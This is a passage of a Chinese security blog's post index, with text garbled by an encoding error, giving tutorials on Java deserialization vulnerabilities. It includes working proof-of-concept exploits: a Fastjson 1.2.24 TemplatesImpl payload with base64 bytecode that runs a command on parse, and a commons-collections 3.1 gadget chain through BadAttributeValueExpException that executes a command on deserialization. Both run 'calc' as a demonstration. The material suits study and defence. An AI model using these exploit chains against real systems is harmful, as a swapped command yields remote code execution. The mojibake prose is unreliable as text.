æ–‡ä»¶è¯»å–åˆ°å­—èŠ‚æ•°ç»„ä¸­ï¼Œä½†è¿™æ ·å¤ªè¿‡ç²—æš´ä¸”ä¸åˆ©äºç§»æ¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ“ä½œ Java å­—èŠ‚ç åº“ javassist æ¥è·å– Class å­—èŠ‚æ•°ç»„ã€‚\nç¬¬äºŒä¸ªé—®é¢˜éœ€è¦æˆ‘ä»¬å°† Class å­—èŠ‚æ•°ç»„è¿›è¡Œ Base64 ç¼–ç ï¼ŒFastjson åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿›è¡Œè§£ç ã€‚\nç¬¬ä¸‰ä¸ªé—®é¢˜éœ€è¦æˆ‘ä»¬åœ¨ååºåˆ—åŒ–JSONå­—ç¬¦ä¸²æ—¶æŒ‡å®š Fastjson æ”¯æŒæ²¡æœ‰ set æ–¹æ³•çš„æˆå‘˜å˜é‡ï¼Œå› æ­¤ä¹Ÿæ³¨å®šäº†æ­¤ç§æ–¹å¼å¯åˆ©ç”¨èŒƒå›´è¾ƒå°ã€‚\næµ‹è¯• åœ¨ pom.xml ä¸­å¢åŠ  javassist ä¾èµ–ã€‚\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç¼–å†™æµ‹è¯•ä»£ç ï¼š\nimport com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javassist.ClassPool; import javassist.CtClass; import java.io.IOException; import java.util.Base64; import java.util.Collections; import java.util.LinkedHashMap; import java.util.Map; public class Eval2 { public static class EvalTransletClass extends AbstractTranslet { public EvalTransletClass() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } public static void main(String[] args) throws Exception { // è¯»å–ç¼–è¯‘åçš„ class æ–‡ä»¶ä¸ºå­—èŠ‚æ•°ç»„ ClassPool classPool = ClassPool.getDefault(); final CtClass ctClass = classPool.get(EvalTransletClass.class.getName()); final byte[] bytes = ctClass.toBytecode(); // å°† class å­—èŠ‚æ•°ç»„ç¼–ç ä¸º base64 final String byteCode = Base64.getEncoder().encodeToString(bytes); // æ„é€  POCï¼Œè¿™é‡Œä½¿ç”¨ LinkedHashMap æ˜¯å› ä¸ºè¦ä¿è¯é¡ºåºï¼Œ@type è¦æ”¾åˆ°ç¬¬ä¸€ä½ final Map\u0026lt;String, Object\u0026gt; pocMap = new LinkedHashMap\u0026lt;\u0026gt;(); pocMap.put(\u0026#34;@type\u0026#34;, \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;); pocMap.put(\u0026#34;_bytecodes\u0026#34;, Collections.singletonList(byteCode)); pocMap.put(\u0026#34;_name\u0026#34;, \u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); pocMap.put(\u0026#34;_outputProperties\u0026#34;, new Object()); pocMap.put(\u0026#34;_tfactory\u0026#34;, new Object()); final String poc = JSON.toJSONString(pocMap); System.out.println(\u0026#34;POC JSON:\u0026#34;+poc); // POC JSON:{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;,\u0026#34;_bytecodes\u0026#34;:[\u0026#34;yv66vgAAADQAMQoABgAhCgAiACMIACQKACIAJQcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARRXZhbFRyYW5zbGV0Q2xhc3MBAAxJbm5lckNsYXNzZXMBADJMY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzOwEACkV4Y2VwdGlvbnMHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEACkV2YWwyLmphdmEMAAcACAcAKwwALAAtAQAEY2FsYwwALgAvBwAwAQAwY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAeY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFgAEABcADQAYAAsAAAAMAAEAAAAOAAwADwAAABAAAAAEAAEAEQABABIAEwADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAHQALAAAAIAADAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAAZAAAACQIAFAAAABYAAAABABIAGgADAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAIgALAAAAKgAEAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAQAAAABAABABgAGQAAAA0DABQAAAAbAAAAHQAAAAIAHwAAAAIAIAAOAAAACgABAAUAJgANAAk=\u0026#34;],\u0026#34;_name\u0026#34;:\u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;,\u0026#34;_outputProperties\u0026#34;:{}} // ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ JSON.parseObject(poc, Feature.SupportNonPublicField); } } è¿è¡Œä¹‹åå°†ä¼šçœ‹åˆ°å¼¹å‡ºäº†è®¡ç®—å™¨ã€‚\næ³¨ æ–‡ä¸­æµ‹è¯•ä½¿ç”¨ç³»ç»Ÿå’Œå·¥å…·ç‰ˆæœ¬å¦‚ä¸‹ï¼š\næ“ä½œç³»ç»Ÿ windows 10 20H2 jdk java 1.8.0_301 fastjson 1.2.24 javassist 3.28.0-GA ä»£ç ä»“åº“ https://github.com/dushixiang/java-serialization-vulnerability å…¶ä»– æ­¤ç§æ–¹å¼å¯åˆ©ç”¨èŒƒå›´è¾ƒå°ï¼Œä½†åœ¨é«˜ç‰ˆæœ¬JDKä¸Šä¾ç„¶å¯ä»¥åˆ©ç”¨æˆåŠŸã€‚\nå¸¸è§çš„ Fastjson æ¼æ´åˆ©ç”¨è¿˜æœ‰ RMI/JNDI å’Œ LDAPï¼Œä½†åœ¨é«˜ç‰ˆæœ¬çš„JDKä¸­ï¼ŒJavaå®˜æ–¹è§‰å¾—è¯·æ±‚è¿œç¨‹åœ°å€ä¸Šçš„ç±»æ˜¯ä¸€ä¸ªå¾ˆå±é™©çš„æ“ä½œï¼Œæ‰€ä»¥åœ¨æœ€æ–°çš„JDKä¸­é»˜è®¤å…³é—­äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨åé¢ä¹Ÿä¼šè¯¦ç»†ä»‹ç»ã€‚\n","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-3/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"fastjson-æ˜¯ä»€ä¹ˆ\"\u003eFastjson æ˜¯ä»€ä¹ˆ\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003efastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003efastjsonç›¸å¯¹å…¶ä»–JSONåº“çš„ç‰¹ç‚¹æ˜¯å¿«ã€‚fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œfastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eä»¥ä¸Šæ‘˜è‡ªFastjson GitHub ä»‹ç»ã€‚\u003c/p\u003e\n\u003cp\u003eä½†è¿‘å¹´æ¥éšç€ Fastjson ä¸æ–­çˆ†å‡ºæ¼æ´ï¼Œå„å¤§ä¸­å°å‹å…¬å¸éƒ½é€æ¸å¼ƒç”¨ Fastjson ï¼Œç”šè‡³é˜¿é‡Œè‡ªå·±å¼€æºçš„æœåŠ¡æ³¨å†Œã€é…ç½®ç®¡ç†å¹³å° \u003cstrong\u003eNACOS\u003c/strong\u003e åœ¨ 1.3.0 ç‰ˆæœ¬ä¹‹åéƒ½ä» Fastjson æ›¿æ¢ä¸ºäº† Jackson (è¯¦è§ \u003ca href=\"https://github.com/alibaba/nacos/releases/tag/1.3.0\"\u003ehttps://github.com/alibaba/nacos/releases/tag/1.3.0\u003c/a\u003e) ï¼Œå¯è§æ¼æ´å±å®³ä¹‹å¤§ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨-fastjson-\"\u003eä¸ºä»€ä¹ˆä¼šå¼ƒç”¨ Fastjson ï¼Ÿ\u003c/h2\u003e\n\u003cp\u003eæƒ³è¦ç ”ç©¶ä¸€ä¸ªäº§å“çš„æ¼æ´å…¶ä¸­æœ‰ä¸€æ¡å¾ˆå¥½çš„é€”å¾„å°±æ˜¯å»æŸ¥è¯¢ CVE ç¼–å·ï¼Œä½†æ˜¯æˆ‘åœ¨æ£€ç´¢ä¹‹åå‘ç° Fastjson åªæœ‰ \u003cstrong\u003eCVE-2017-18349\u003c/strong\u003e è¿™ä¸€æ¡ï¼Œè€Œ Jackson ç«Ÿç„¶æœ‰é«˜è¾¾ 76 æ¡ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™èƒ½å¦è¯æ˜ Fastjson æ¯” Jackson æ›´å®‰å…¨å‘¢ï¼Ÿç­”æ¡ˆå¹¶ä¸æ˜¯ï¼Œéƒ½æ˜¯åŠæ–¤å…«ä¸¤ï¼Œæœ‰äº› Fastjson é‡Œé¢å‡ºç°çš„æ¼æ´åœ¨ Jackson é‡Œé¢ä¹ŸåŒæ ·å­˜åœ¨ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¸ºä»€ä¹ˆä¼šæœ‰å…¬å¸å¼ƒç”¨ Fastjson å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæˆ–è®¸æ˜¯ Jackson æœ‰æ›´å®Œå–„ä¸”å…¬å¼€çš„æ¼æ´ç®¡ç†æœºåˆ¶ï¼Œæˆ–è®¸æ˜¯å›½å¤–çš„æœˆäº®æ¯”è¾ƒåœ†ï¼Œæˆ–è®¸æ˜¯éšå¤§æµï¼Œä¹Ÿæˆ–è®¸æ˜¯ Fastjson ä»£ç è´¨é‡ä¸è¿‡å…³ï¼ˆçŸ¥ä¹ä¸Šæœ‰å¾ˆå¤šå›ç­”æ‰¹åˆ¤ Fastjson ä»£ç ç³Ÿç³•çš„ï¼‰ï¼ŒçœŸå®åŸå› å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå°½ç®¡è¿‘å¹´æ¥æœ‰å…¬å¸ä¸æ–­å¼ƒç”¨ Fastjson ï¼Œä½†è¿˜æœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”å·²ç»å¼€å‘ä¸Šçº¿çš„ç³»ç»Ÿæƒ³è¦æ›¿æ¢æˆ–è€…å‡çº§ Fastjson è¿˜éœ€è¦æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹ Fastjson æ¼æ´çš„äº§å› ã€‚\u003c/p\u003e\n\u003ch2 id=\"fastjson-æ¼æ´äº§ç”ŸåŸå› \"\u003eFastjson æ¼æ´äº§ç”ŸåŸå› \u003c/h2\u003e\n\u003cp\u003eFastjson ç¬¬ä¸€æ¬¡è¢«çˆ†å‡ºæœ‰æ¼æ´æ˜¯å®˜æ–¹åœ¨2017å¹´3æœˆ15æ—¥ä¸»åŠ¨æŠ«éœ²çš„ï¼Œè¯¦è§ \u003ca href=\"https://github.com/alibaba/fastjson/wiki/security_update_20170315\"\u003ehttps://github.com/alibaba/fastjson/wiki/security_update_20170315\u003c/a\u003e ã€‚æ¼æ´å½±å“ 1.2.24 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä»Šå¤©æ¥ç ”ç©¶ä¸€ä¸‹å½“ fastjson version \u0026lt;= 1.2.24 æ—¶æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸‰ï¼‰fastjson 1.2.24 Templateslmpl åˆ©ç”¨åŸç†"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\næ–°çš„å¸Œæœ› 0x00 åœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº† Java ååºåˆ—åŒ–æ¼æ´çš„æˆå› å’Œåˆ©ç”¨ commons-collections 3.1 æ­é… sun.reflect.annotation.AnnotationInvocationHandler å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä½†sun.reflect.annotation.AnnotationInvocationHandler çš„é—®é¢˜å·²ç»åœ¨æœ€æ–°ç‰ˆ jdk ä¸­ä¿®å¤ï¼Œå¯åˆ©ç”¨èŒƒå›´ä»…èƒ½å¤Ÿå±€é™äºæ—§ç‰ˆæœ¬çš„jdkã€‚ç»è¿‡å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼Œå¦ä¸€ä¸ªç±» javax.management.BadAttributeValueExpException å‡ºç°åœ¨äº†å®‰å…¨äººå‘˜çš„è§†é‡ã€‚\njavax.management.BadAttributeValueExpException ç»§æ‰¿è‡ª java.lang.Exceptionï¼Œjava.lang.Exception ç»§æ‰¿è‡ª java.lang.Throwableï¼Œè€Œ java.lang.Throwable å®ç°äº† java.io.Serializableã€‚å› æ­¤ javax.management.BadAttributeValueExpException ç¬¦åˆäº† å¯åºåˆ—åŒ– è¿™ä¸ªè¦æ±‚ï¼ŒåŒæ ·çš„å®ƒä¹Ÿå¢åŠ äº† readObject æ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it. * * @since 1.5 */ public class BadAttributeValueExpException extends Exception { /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of {@code attribute.toString()} */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } /** * Returns the string representing the object. */ public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } å°ä¼™ä¼´ä»¬å¯èƒ½ä¼šå¾ˆè¿·èŒ«ï¼Œè¿™è¦ä½•ä»ä¸‹æ‰‹ï¼Ÿ\nåˆ«ç€æ€¥ï¼Œæˆ‘æ¥ä¸€ç‚¹ç‚¹çš„åˆ†æã€‚\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹è¿™ä¸ªæ–¹æ³•çš„ç¬¬ä¸€è¡Œä»£ç  ObjectInputStream.GetField gf = ois.readFields();ï¼Œå®ƒçš„æ„æ€æ˜¯ä»å·²ç»åºåˆ—åŒ–æˆå­—èŠ‚æ•°ç»„çš„ä¿¡æ¯ä¸­è·å– åºåˆ—åŒ–å‰çš„ç±» çš„å…¨éƒ¨æˆå‘˜å˜é‡ã€‚\nç¬¬äºŒè¡Œä»£ç  Object valObj = gf.get(\u0026quot;val\u0026quot;, null); çš„æ„æ€æ˜¯è·å–åè¯ä¸º val çš„æˆå‘˜å˜é‡ï¼Œå¦‚æœè·å–ä¸åˆ°å°±è¿”å› nullã€‚\næ¥ä¸‹æ¥å‰ä¸¤ä¸ªçš„ if åˆ¤æ–­å¾ˆç®€å•ï¼Œå°±ä¸è§£é‡Šäº†ã€‚\nç¬¬ä¸‰ä¸ª if åˆ¤æ–­ä¸­åªè¦ System.getSecurityManager() æ˜¯ç©ºå€¼æˆ–è€… valObj æ˜¯åŸºæœ¬æ•°æ®åŒ…è£…ç±»å‹å°±è°ƒç”¨ toString() æ–¹æ³•è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚\né—®é¢˜å°±å‡ºåœ¨è¿™ä¸ª toString() ä¸Šã€‚\n0x01 å®‰å…¨äººå‘˜åœ¨å®¡æŸ¥ commons-collections 3.1 çš„æºç æ—¶å‘ç° org.apache.commons.collections.keyvalue.TiedMapEntry çš„ toString() æ–¹æ³•å¦‚ä¸‹ï¼š\npublic String toString() { return getKey() + \u0026#34;=\u0026#34; + getValue(); } getKey() å’Œ getValue() ä»£ç å¦‚ä¸‹ï¼š\npublic class TiedMapEntry implements Map.Entry, KeyValue, Serializable { /** Serialization version */ private static final long serialVersionUID = -8453869361373831205L; /** The map underlying the entry/iterator */ private final Map map; /** The key */ private final Object key; /** * Constructs a new entry with the given Map and key. * * @param map the map * @param key the key */ public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } // Map.Entry interface //------------------------------------------------------------------------- /** * Gets the key of this entry * * @return the key */ public Object getKey() { return key; } /** * Gets the value of this entry direct from the map. * * @return the value */ public Object getValue() { return map.get(key); } ä»£ç çœç•¥... } getKey() ç›´æ¥è¿”å›äº†å­—ç¬¦ä¸²ï¼Œä¸ç”¨è€ƒè™‘äº†ã€‚\ngetValue() æ˜¯ä»æ„é€ æ–¹æ³•ä¼ å…¥çš„ map ä¸­æ ¹æ® ä¼ å…¥çš„key è·å–å€¼ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ª Map çš„ get æ–¹æ³•å¯ä»¥è°ƒç”¨ org.apache.commons.collections.Transformer çš„ transform æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œè€Œä¸”å®ƒè¿˜æ˜¯ commons-collections 3.1 ä¸­çš„ä¸€ä¸ªç±»ã€‚\n0x02 org.apache.commons.collections.map.LazyMap é¡¾åæ€ä¹‰æ˜¯ä¸€ä¸ªæ‡’åŠ è½½çš„ Mapï¼Œå®ƒç»§æ‰¿è‡ª AbstractMapDecorator,å¹¶ä¸”å®ç°äº† Map å’Œ Serializableæ¥å£ã€‚ å®ƒçš„æ„é€ æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ java.util.Mapï¼Œä¸€ä¸ªæ˜¯org.apache.commons.collections.Transformerã€‚å®ƒé‡å†™äº†Mapçš„ get æ–¹æ³•ï¼Œå…ˆåˆ¤æ–­æ„é€ æ–¹æ³•ä¼ å…¥çš„ map ä¸­æ˜¯å¦åŒ…å« keyï¼Œä¸åŒ…å«æ—¶ä¼šè°ƒç”¨ transformer çš„ transform çš„æ–¹æ³•è¿›è¡Œè½¬æ¢ï¼Œå¹¶è¿›è¡Œåç»­çš„èµ‹å€¼å’Œè¿”å›ï¼Œä»£ç å¦‚ä¸‹:\npublic Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } ç»åœ°å½’æ¥ ç»è¿‡ä¸Šè¿°æ­¥éª¤çš„åˆ†æï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªè°ƒç”¨é“¾ã€‚\n,--------------------. ,------------. |LazyMap | |TiedMapEntry| ,-----------------------. |--------------------| |------------| |Transformer | |Map map; | |Map map; | |-----------------------|--|Transformer factory;|---|String key; | |transform(Object input)| | | | | `-----------------------\u0026#39; |get(String key); | |toString(); | `--------------------\u0026#39; `------------\u0026#39; | | ,----------------------------------. |BadAttributeValueExpException | |----------------------------------| |TiedMapEntry val; | |readObject(ObjectInputStream ois);| `----------------------------------\u0026#39; ä¸‹é¢æˆ‘ä»¬æ¥å®é™…æµ‹è¯•ä¸€ä¸‹ã€‚\nä¸ºç®€åŒ–ä»£ç ï¼Œæˆ‘ä»¬æŠŠåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç åšæˆå·¥å…·ç±»ä½¿ç”¨ã€‚\nimport java.io.*; /** * åºåˆ—åŒ–å·¥å…· */ public class Serializer { /** * å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ * @param obj å¯¹è±¡ * @return å­—èŠ‚æ•°ç»„ * @throws IOException IOå¼‚å¸¸ */ public static byte[] serialize(final Object obj) throws IOException { final ByteArrayOutputStream out = new ByteArrayOutputStream(); try (ObjectOutputStream objOut = new ObjectOutputStream(out)) { objOut.writeObject(obj); objOut.flush(); } return out.toByteArray(); } /** * å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–å¯¹è±¡ * @param bytes å­—èŠ‚æ•°ç»„ * @return å¯¹è±¡ * @throws IOException IOå¼‚å¸¸ * @throws ClassNotFoundException ç±»æ‰¾ä¸åˆ°å¼‚å¸¸ */ public static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException { try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes))) { return input.readObject(); } } } ä¿®æ”¹ä¹‹å‰çš„æµ‹è¯•ä»£ç ã€‚\nimport cn.typesafe.jsv.util.Serializer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; import java.nio.charset.StandardCharsets; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp4 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // åœ¨è°ƒç”¨ get æ–¹æ³•æ—¶ä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ key æ—¶ä¼šè°ƒç”¨ Transformer çš„ transform æ–¹æ³• Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); // åœ¨è°ƒç”¨ toString æ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ getValue æ–¹æ³•å¹¶ä½¿ç”¨ æ„é€ æ–¹æ³•ä¼ å…¥çš„ key å½“ä½œ key TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); // åˆ›å»ºBadAttributeValueExpExceptionå¯¹è±¡ï¼Œç±»å‹æ˜¯ public çš„ï¼Œæ— éœ€ä½¿ç”¨åå°„åˆ›å»º BadAttributeValueExpException obj = new BadAttributeValueExpException(null); // æˆå‘˜ val æ²¡æœ‰setVal æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡åå°„ä¿®æ”¹ Field valField = obj.getClass().getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(obj, entry); /*-----------------------ä»¥ä¸‹æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–æµ‹è¯•----------------------------*/ // å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ– final String data = Base64.getEncoder().encodeToString(Serializer.serialize(obj)); System.out.println(\u0026#34;åºåˆ—åŒ–åï¼š\u0026#34; + data); // å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„ final Object o = Serializer.deserialize(Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8))); System.out.println(\u0026#34;ååºåˆ—åŒ–ï¼š\u0026#34;+o); } } åœ¨æœ€æ–°ç‰ˆ jdk 1.8.0_301 ä¸Šæµ‹è¯•é€šè¿‡ï¼Œå¼¹å‡ºäº†è®¡ç®—å™¨ã€‚\nè¥¿æ–¯çš„å¤ä»‡ 0x00 æœ‰æ 